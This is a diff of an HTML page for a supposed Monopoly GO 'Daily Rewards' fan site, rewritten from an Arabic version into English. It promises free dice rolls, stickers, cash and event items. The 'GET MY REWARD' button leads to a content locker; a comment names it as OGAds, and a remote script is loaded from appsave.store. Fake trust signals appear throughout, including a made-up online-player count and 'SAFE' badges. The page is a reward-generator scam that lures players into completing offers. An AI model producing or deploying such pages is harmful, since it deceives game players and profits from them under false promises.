@@ -1,254 +1,316 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monopoly GO! - اختر مكافأتك</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Rewards • Fan Page</title>
 
-        body {
-            background-color: #e3f2fd;
-            display: flex;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            overflow: hidden;
-            border: 2px solid #e0e0e0;
-        }
-
-        .header-img {
-            width: 100%;
-            display: block;
-        }
-
-        .content {
-            padding: 20px;
-            text-align: center;
-        }
-
-        .title {
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a237e;
-            margin-bottom: 5px;
-        }
-
-        .subtitle {
-            font-size: 13px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-
-        /* أقسام الاختيارات */
-        .section {
-            background: #f4f8ff;
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 15px;
-            text-align: right;
-            border: 1px solid #d0e1fd;
-        }
-
-        .section-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #0d47a1;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-        }
-
-        .option-card {
-            background: #fff;
-            border: 2px solid #cfd8dc;
-            border-radius: 10px;
-            padding: 10px 5px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .option-card.selected {
-            border-color: #29b6f6;
-            background: #e1f5fe;
-            box-shadow: 0 0 8px rgba(41, 182, 246, 0.4);
-        }
-
-        .option-card span {
-            display: block;
-            font-size: 12px;
-            font-weight: bold;
-            color: #333;
-        }
-
-        .radio-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            border: 2px solid #b0bec5;
-            margin: 6px auto 0;
-            background: #fff;
-        }
-
-        .option-card.selected .radio-dot {
-            border-color: #0288d1;
-            background: #0288d1;
-        }
-
-        /* زر الحصول على المكافأة */
-        .reward-btn {
-            width: 100%;
-            padding: 16px;
-            border: 0;
-            border-radius: 14px;
-            background: linear-gradient(135deg, #25d366, #128c7e);
-            color: #fff;
-            font-size: 18px;
-            font-weight: 800;
-            cursor: pointer;
-            box-shadow: 0 5px 0 #0b6358;
-            margin-top: 10px;
-            transition: transform 0.1s;
-        }
-
-        .reward-btn:active {
-            transform: translateY(4px);
-            box-shadow: 0 1px 0 #0b6358;
-        }
-
-        /* حاوية القفل Locker */
-        .locker-container {
-            display: none;
-            margin-top: 20px;
-            padding: 18px;
-            border-radius: 16px;
-            background: #f7f7f7;
-            border: 2px solid #e1b62b;
-            animation: lockerShow .35s ease;
-        }
-
-        .locker-box {
-            text-align: center;
-            color: #222;
-        }
-
-        .locker-box h3 { margin-bottom: 8px; }
-        .locker-box p { font-size: 14px; color: #666; margin-bottom: 15px; }
-
-        @keyframes lockerShow {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-    </style>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;600;700;800&family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<div class="container">
-    <img src="https://via.placeholder.com/500x200/0288d1/ffffff?text=MONOPOLY+GO!" alt="Monopoly Go Header" class="header-img">
-
-    <div class="content">
-        <h2 class="title">اختر مكافأتك</h2>
-        <p class="subtitle">حدد العناصر التي ترغب بالحصول عليها للبدء:</p>
-
-        <!-- قسم النرد -->
-        <div class="section">
-            <div class="section-title">🎲 عدد الرمايات (Dice Rolls)</div>
-            <div class="options-grid">
-                <div class="option-card selected" onclick="selectOption(this)">
-                    <span>25</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>100</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>500</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>1,000</span>
-                    <div class="radio-dot"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- قسم البطاقات -->
-        <div class="section">
-            <div class="section-title">🃏 حزم الملصقات (Stickers)</div>
-            <div class="options-grid">
-                <div class="option-card selected" onclick="selectOption(this)">
-                    <span>1 Pack</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>3 Packs</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>5 Packs</span>
-                    <div class="radio-dot"></div>
-                </div>
-                <div class="option-card" onclick="selectOption(this)">
-                    <span>10 Packs</span>
-                    <div class="radio-dot"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- زر التأكيد -->
-        <button class="reward-btn" onclick="showReward()">
-            🎁 GET MY REWARD ➔
-        </button>
-
-        <!-- حاوية القفل الخاص بـ OGAds -->
-        <div id="locker" class="locker-container">
-            <div class="locker-box">
-                <div data-captcha-enable="true"></div>
-            </div>
-        </div>
+<header class="header">
+  <div class="menu">☰</div>
+  <div class="brand">
+    <span>DAILY</span>
+    <strong>REWARDS</strong>
+  </div>
+  <div class="online">
+    <span class="dot"></span>
+    <div>
+      <small>PLAYERS ONLINE</small>
+      <b id="onlineNumber">24,853</b>
     </div>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero-content">
+    <div class="mascot">🎩</div>
+    <div class="hero-text">
+      <div class="mini-title">DAILY REWARD HUB</div>
+      <h1>PLAY MORE <br> <span>GET MORE</span></h1>
+      <p>Dice Rolls • Stickers • Rewards • Events</p>
+      <div class="hero-badges">
+        <span>🎲 Dice</span>
+        <span>🎁 Rewards</span>
+        <span>⭐ Stickers</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<nav class="tabs">
+  <button class="tab active" data-tab="dice">
+    <span>🎲</span>
+    <b>DICE ROLLS</b>
+  </button>
+  <button class="tab" data-tab="stickers">
+    <span>🃏</span>
+    <b>STICKERS</b>
+  </button>
+  <button class="tab" data-tab="rewards">
+    <span>🎁</span>
+    <b>REWARDS</b>
+  </button>
+  <button class="tab" data-tab="events">
+    <span>📅</span>
+    <b>EVENTS</b>
+  </button>
+</nav>
+
+<main class="container">
+  <div class="heading">
+    <span class="step-number">1</span>
+    <div>
+      <h2>CHOOSE YOUR REWARD</h2>
+      <p>Select what you want and continue to the next step.</p>
+    </div>
+  </div>
+
+  <section class="reward-section blue-section" id="dice">
+    <div class="section-title">
+      <div class="big-icon">🎲</div>
+      <div>
+        <h3>DICE ROLLS</h3>
+        <p>Choose the amount of dice rolls:</p>
+      </div>
+    </div>
+    <div class="choices">
+      <label class="choice selected">
+        <input type="radio" name="dice" value="25 Dice Rolls" checked>
+        <div class="choice-content">
+          <span>🎲</span>
+          <strong>25</strong>
+          <small>Dice Rolls</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="dice" value="100 Dice Rolls">
+        <div class="choice-content">
+          <span>🎲🎲</span>
+          <strong>100</strong>
+          <small>Dice Rolls</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="dice" value="500 Dice Rolls">
+        <div class="choice-content">
+          <span>🎲🎲🎲</span>
+          <strong>500</strong>
+          <small>Dice Rolls</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="dice" value="1000 Dice Rolls">
+        <div class="choice-content">
+          <span>🎲🎲🎲🎲</span>
+          <strong>1,000</strong>
+          <small>Dice Rolls</small>
+        </div>
+      </label>
+    </div>
+  </section>
+
+  <section class="reward-section purple-section" id="stickers">
+    <div class="section-title">
+      <div class="big-icon">🃏</div>
+      <div>
+        <h3>STICKERS</h3>
+        <p>Choose your sticker pack:</p>
+      </div>
+    </div>
+    <div class="choices">
+      <label class="choice">
+        <input type="radio" name="stickers" value="1 Sticker Pack">
+        <div class="choice-content">
+          <span>🟢</span>
+          <strong>1</strong>
+          <small>Pack</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="stickers" value="3 Sticker Packs">
+        <div class="choice-content">
+          <span>🔵</span>
+          <strong>3</strong>
+          <small>Packs</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="stickers" value="5 Sticker Packs">
+        <div class="choice-content">
+          <span>🟣</span>
+          <strong>5</strong>
+          <small>Packs</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="stickers" value="10 Sticker Packs">
+        <div class="choice-content">
+          <span>🟡</span>
+          <strong>10</strong>
+          <small>Packs</small>
+        </div>
+      </label>
+    </div>
+  </section>
+
+  <section class="reward-section green-section" id="rewards">
+    <div class="section-title">
+      <div class="big-icon">🎁</div>
+      <div>
+        <h3>REWARDS</h3>
+        <p>Choose your reward:</p>
+      </div>
+    </div>
+    <div class="choices">
+      <label class="choice">
+        <input type="radio" name="reward" value="Cash">
+        <div class="choice-content">
+          <span>💵</span>
+          <strong>Cash</strong>
+          <small>Reward</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="reward" value="Megaways">
+        <div class="choice-content">
+          <span>🪙</span>
+          <strong>Megaways</strong>
+          <small>Reward</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="reward" value="Boosts">
+        <div class="choice-content">
+          <span>⚡</span>
+          <strong>Boosts</strong>
+          <small>Reward</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="reward" value="Leaderboard">
+        <div class="choice-content">
+          <span>🏆</span>
+          <strong>Leaderboard</strong>
+          <small>Reward</small>
+        </div>
+      </label>
+    </div>
+  </section>
+
+  <section class="reward-section yellow-section" id="events">
+    <div class="section-title">
+      <div class="big-icon">📅</div>
+      <div>
+        <h3>EVENTS</h3>
+        <p>Choose an event item:</p>
+      </div>
+    </div>
+    <div class="choices">
+      <label class="choice">
+        <input type="radio" name="event" value="Pickaxe">
+        <div class="choice-content">
+          <span>⛏️</span>
+          <strong>Pickaxe</strong>
+          <small>Event Item</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="event" value="Flowers">
+        <div class="choice-content">
+          <span>🌸</span>
+          <strong>Flowers</strong>
+          <small>Event Item</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="event" value="Gems">
+        <div class="choice-content">
+          <span>💎</span>
+          <strong>Gems</strong>
+          <small>Event Item</small>
+        </div>
+      </label>
+      <label class="choice">
+        <input type="radio" name="event" value="Tokens">
+        <div class="choice-content">
+          <span>🪙</span>
+          <strong>Tokens</strong>
+          <small>Event Item</small>
+        </div>
+      </label>
+    </div>
+  </section>
+
+  <section class="user-step">
+    <div class="step-number">2</div>
+    <div class="user-content">
+      <h3>SELECTED REWARD</h3>
+      <p id="selectedReward">25 Dice Rolls</p>
+    </div>
+  </section>
+
+  <button class="reward-button" id="rewardButton">
+    <span>🎁</span> GET MY REWARD <b>→</b>
+  </button>
+
+  <div class="status-box">
+    <span>ⓘ</span>
+    <p>Follow the next steps to continue.</p>
+  </div>
+
+  <div class="trust">
+    <div>
+      <span>⚡</span>
+      <strong>FAST</strong>
+      <small>Quick process</small>
+    </div>
+    <div>
+      <span>🛡️</span>
+      <strong>SAFE</strong>
+      <small>No password required</small>
+    </div>
+    <div>
+      <span>❤️</span>
+      <strong>FAN MADE</strong>
+      <small>Community project</small>
+    </div>
+  </div>
+
+  <!-- حاوية اللوكر الخاص بك -->
+  <div id="locker" class="locker-box">
+    <div data-captcha-enable="true"></div>
+  </div>
+</main>
+
+<div class="modal" id="modal">
+  <div class="modal-card">
+    <button class="close" id="closeModal">×</button>
+    <div class="loading-icon">🎲</div>
+    <h2>GETTING YOUR REWARD</h2>
+    <p id="modalText">Preparing your selected reward...</p>
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <strong class="progress-number" id="progressNumber">0%</strong>
+    <button class="continue-button" id="continueButton" style="display:none;">CONTINUE →</button>
+  </div>
 </div>
 
-<script>
-function selectOption(element) {
-    const parentGrid = element.parentElement;
-    const cards = parentGrid.querySelectorAll('.option-card');
-    cards.forEach(card => card.classList.remove('selected'));
-    element.classList.add('selected');
-}
+<footer>
+  <strong>Daily Rewards Fan Hub</strong>
+  <p>This is an independent fan-made website. It is not affiliated with, endorsed by, or sponsored by Scopely, Hasbro, or MONOPOLY GO.</p>
+  <small>© 2026 Fan Community</small>
+</footer>
 
-function showReward() {
-    const locker = document.getElementById("locker");
-    locker.style.display = "block";
-    locker.scrollIntoView({
-        behavior: "smooth",
-        block: "center"
-    });
-}
-</script>
-
-<!-- سكريبت اللوكر الخاص بك من OGAds -->
+<script src="script.js"></script>
+<!-- رابط السكربت الخاص بك من الصورة -->
 <script type="text/javascript" src="https://appsave.store/cp/js/304xn"></script>
 
 </body>
